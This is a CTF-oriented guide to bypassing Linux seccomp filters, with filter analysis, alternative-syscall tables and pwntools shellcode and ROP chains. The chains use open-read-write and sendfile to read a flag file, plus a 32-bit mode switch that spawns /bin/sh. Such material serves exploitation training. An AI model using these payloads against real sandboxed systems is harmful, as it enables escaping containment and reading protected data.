# Seccomp Bypass Techniques

Advanced techniques for bypassing seccomp filters.

## Understanding Seccomp

Seccomp (Secure Computing Mode) restricts which syscalls a process can make. Two modes:
- **Strict mode**: Only read/write/exit/_exit allowed
- **Filter mode (BPF)**: Custom syscall whitelist/blacklist

## Analyzing Seccomp Rules

### Using seccomp-tools
```bash
seccomp-tools dump ./binary

# Example output:
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
#  0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
#  0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
#  0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
#  0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL
```

### Common Filter Patterns

| Pattern | Allowed | Blocked |
|---------|---------|---------|
| ORW | open, read, write | execve, mmap |
| No shell | everything except execve/execveat | execve |
| Whitelist | specific syscalls | everything else |
| Blacklist | everything except | specific syscalls |

## Bypass Technique 1: Alternative Syscalls

### Syscall Alternatives Table

| Blocked | Alternative | Syscall # |
|---------|-------------|-----------|
| `open` | `openat` | 257 |
| | `openat2` | 437 |
| `read` | `pread64` | 17 |
| | `readv` | 19 |
| `write` | `pwrite64` | 18 |
| | `writev` | 20 |
| `execve` | `execveat` | 322 |
| `mmap` | `mremap` | 25 |
| `mprotect` | `pkey_mprotect` | 329 |
| `dup2` | `dup3` | 292 |

### Example: openat Instead of open
```python
from pwn import *

context.arch = 'amd64'

# openat(AT_FDCWD, "flag.txt", O_RDONLY)
shellcode = asm('''
    mov rax, 257        # openat syscall
    mov rdi, -100       # AT_FDCWD
    lea rsi, [rip+flag]
    xor rdx, rdx        # O_RDONLY
    syscall

flag:
    .asciz "flag.txt"
''')
```

## Bypass Technique 2: ORW (Open-Read-Write)

When `execve` is blocked, read the flag directly:

### Shellcode Version
```python
from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    /* open("flag.txt", 0) */
    xor rax, rax
    mov al, 2
    lea rdi, [rip+flag]
    xor rsi, rsi
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov rdi, rax
    xor rax, rax
    lea rsi, [rsp-0x100]
    mov rdx, 0x100
    syscall

    /* write(1, rsp-0x100, 0x100) */
    mov rdi, 1
    xor rax, rax
    inc rax
    lea rsi, [rsp-0x100]
    mov rdx, 0x100
    syscall

flag:
    .asciz "flag.txt"
''')
```

### ROP Version (NX enabled)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])

flag_str = elf.bss() + 0x100
flag_buf = elf.bss() + 0x200

# Write "flag.txt" to BSS
rop.read(0, flag_str, 9)

# open("flag.txt", 0)
rop.call('open', [flag_str, 0])

# read(3, flag_buf, 0x100)
rop.call('read', [3, flag_buf, 0x100])

# write(1, flag_buf, 0x100)
rop.call('write', [1, flag_buf, 0x100])

payload = b'A' * offset + rop.chain()

io.send(payload)
io.send(b'flag.txt\x00')
```

## Bypass Technique 3: Architecture Confusion

Some filters only check x86_64 syscalls. Try 32-bit:

```python
# If filter only checks arch == x86_64
# Switch to 32-bit mode via retf

shellcode = asm('''
    /* Push 32-bit code segment selector and address */
    push 0x23           # 32-bit CS
    push shellcode_32   # 32-bit code address

    retf                # Far return switches mode

shellcode_32:
    .code32
    /* Now in 32-bit mode - different syscall numbers! */
    mov eax, 11         # execve (32-bit)
    mov ebx, binsh
    xor ecx, ecx
    xor edx, edx
    int 0x80

binsh:
    .asciz "/bin/sh"
''')
```

## Bypass Technique 4: ptrace

If ptrace is allowed, attach to self and modify:

```python
# ptrace can bypass seccomp in some configurations
# PTRACE_POKETEXT to modify filter code
```

## Bypass Technique 5: Kernel Exploitation

If you have kernel vulnerabilities:
- Modify task->seccomp
- Overwrite BPF filter
- Disable seccomp entirely

## Bypass Technique 6: Side Channels

### Time-Based
```python
# Allowed syscall takes longer on certain conditions
# Example: open non-existent vs existent file
```

### Error Codes
```python
# Allowed syscall returns different errors
# Can leak info via errno
```

## Technique 7: sendfile (ORW Alternative)

If sendfile is allowed:
```python
shellcode = asm('''
    /* open("flag.txt", 0) */
    mov rax, 2
    lea rdi, [rip+flag]
    xor rsi, rsi
    syscall

    /* sendfile(1, fd, NULL, 0x100) */
    mov rdi, 1          # stdout
    mov rsi, rax        # source fd
    xor rdx, rdx        # offset = NULL
    mov r10, 0x100      # count
    mov rax, 40         # sendfile
    syscall

flag:
    .asciz "flag.txt"
''')
```

## Common CTF Seccomp Scenarios

### Scenario 1: execve Blocked
**Solution:** ORW to read flag

### Scenario 2: Only read/write Allowed
**Solution:** Leak memory via write, might find flag already loaded

### Scenario 3: No write
**Solution:** Time-based side channel or error oracle

### Scenario 4: Strict (only r/w/exit)
**Solution:** Might need to find flag in existing memory, or use side channels

## Debugging Seccomp Issues

```gdb
# Catch seccomp violations
catch syscall
commands
    printf "Syscall: %d\n", $rax
    continue
end

# Check if syscall would be allowed
shell seccomp-tools emu ./binary <syscall_num>
```

## Tool Reference

### seccomp-tools Commands
```bash
# Dump filter
seccomp-tools dump ./binary

# Emulate syscall
seccomp-tools emu ./binary -a <syscall_num>

# Disassemble filter
seccomp-tools disasm ./binary
```

### Pwntools Helpers
```python
from pwn import *

# Build ORW shellcode
shellcode = shellcraft.cat('flag.txt')

# Or manually
shellcode = shellcraft.open('flag.txt')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

print(asm(shellcode))
```

## Output Format

```
## Seccomp Analysis

### Filter Rules
- Allowed: read, write, open, exit, exit_group
- Blocked: execve, mmap, mprotect, fork

### Bypass Strategy
- Technique: ORW (Open-Read-Write)
- Cannot get shell, but can read flag file

### Payload Type
- Shellcode ORW (NX disabled)
- Or ROP ORW (NX enabled)

### Key Addresses
- pop rdi: 0x401234
- open@plt: 0x401050
- read@plt: 0x401040
- write@plt: 0x401030
```
